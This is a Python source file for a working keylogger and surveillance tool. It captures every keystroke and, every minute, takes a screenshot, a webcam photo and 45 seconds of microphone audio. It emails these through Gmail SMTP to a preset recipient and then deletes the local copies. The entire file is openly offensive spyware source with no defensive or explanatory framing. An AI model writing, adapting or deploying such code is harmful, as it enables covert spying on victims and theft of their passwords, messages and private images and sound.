import logging
import os
import smtplib
import socket
import threading
import time
import pynput
from pynput import keyboard
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
import subprocess
import pyscreenshot as ImageGrab
import cv2
import sounddevice as sd
import soundfile as sf
import numpy as np

# Email Configuration
EMAIL_ADDRESS = "EMAIL_HERE"
EMAIL_PASSWORD = "PASSWORD_AS_PER_README_FILE"
RECIPIENT_EMAIL = ""

# Interval for sending email (in seconds)
SEND_EMAIL_INTERVAL = 60

# Create and configure logger
logging.basicConfig(filename="keylogger.log", level=logging.DEBUG, format="%(asctime)s - %(message)s")

class KeyLogger:
    def __init__(self):
        self.log = ""

    def append_log(self, string):
        self.log += string

    def send_email(self):
        try:
            msg = MIMEMultipart()
            msg["From"] = EMAIL_ADDRESS
            msg["To"] = RECIPIENT_EMAIL
            msg["Subject"] = "Keylogger Report"

            body = MIMEText(self.log)
            msg.attach(body)

            # Take a screenshot and save it as a PNG file
            screenshot = ImageGrab.grab()
            screenshot_filename = "screenshot.png"
            screenshot.save(screenshot_filename)
            
            # Attach the screenshot to the email
            with open(screenshot_filename, "rb") as attachment:
                image_part = MIMEImage(attachment.read(), name=os.path.basename(screenshot_filename))
                msg.attach(image_part)

            # Capture webcam picture
            webcam = cv2.VideoCapture(0)
            _, frame = webcam.read()
            webcam.release()

            # Save the webcam picture as a JPEG file
            webcam_filename = "webcam.jpg"
            cv2.imwrite(webcam_filename, frame)
            
            # Attach the webcam picture to the email
            with open(webcam_filename, "rb") as attachment:
                image_part = MIMEImage(attachment.read(), name=os.path.basename(webcam_filename))
                msg.attach(image_part)

            # Capture audio
            audio_filename = "audio.wav"
            duration = 45  # Duration in seconds
            sample_rate = 44100  # Sample rate in Hz

            # Start recording audio
            audio = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
            sd.wait()

            # Save the audio to a WAV file
            sf.write(audio_filename, audio, sample_rate)

            # Attach the audio file to the email
            with open(audio_filename, "rb") as attachment:
                audio_part = MIMEAudio(attachment.read(), name=os.path.basename(audio_filename))
                msg.attach(audio_part)

            # Send email
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.send_message(msg)

            # Delete the screenshot, webcam picture, and audio files after sending email
            os.remove(screenshot_filename)
            os.remove(webcam_filename)
            os.remove(audio_filename)

            logging.info("Email sent successfully!")
        except Exception as e:
            logging.error("Failed to send email: " + str(e))

        # Reset log after sending email
        self.log = ""

        # Schedule the next email
        threading.Timer(SEND_EMAIL_INTERVAL, self.send_email).start()

    def on_press(self, key):
        try:
            logging.info("Key pressed: " + key.char)
            self.append_log(key.char)
        except AttributeError:
            if key == Key.space:
                self.append_log(" ")
            elif key == Key.enter:
                self.append_log("\n")
            elif key == Key.backspace:
                self.append_log("[BACKSPACE]")
            elif key == Key.esc:
                self.append_log("[ESC]")
            elif key == Key.tab:
                self.append_log("[TAB]")
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                self.append_log("[CTRL]")
            elif key == Key.shift:
                self.append_log("[SHIFT]")
            elif key == Key.alt_l or key == Key.alt_r:
                self.append_log("[ALT]")
            elif key == Key.caps_lock:
                self.append_log("[CAPSLOCK]")
            elif key == Key.delete:
                self.append_log("[DELETE]")
            elif key == Key.up:
                self.append_log("[UP]")
            elif key == Key.down:
                self.append_log("[DOWN]")
            elif key == Key.left:
                self.append_log("[LEFT]")
            elif key == Key.right:
                self.append_log("[RIGHT]")
            elif key == Key.home:
                self.append_log("[HOME]")
            elif key == Key.end:
                self.append_log("[END]")
            elif key == Key.page_up:
                self.append_log("[PAGE UP]")
            elif key == Key.page_down:
                self.append_log("[PAGE DOWN]")
            elif key == Key.insert:
                self.append_log("[INSERT]")
            elif key == Key.menu:
                self.append_log("[MENU]")

    def start_logging(self):
        # Start sending email
        self.send_email()

        # Start listening to key presses
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    # Create a KeyLogger instance and start logging
    keylogger = KeyLogger()
    keylogger.start_logging()
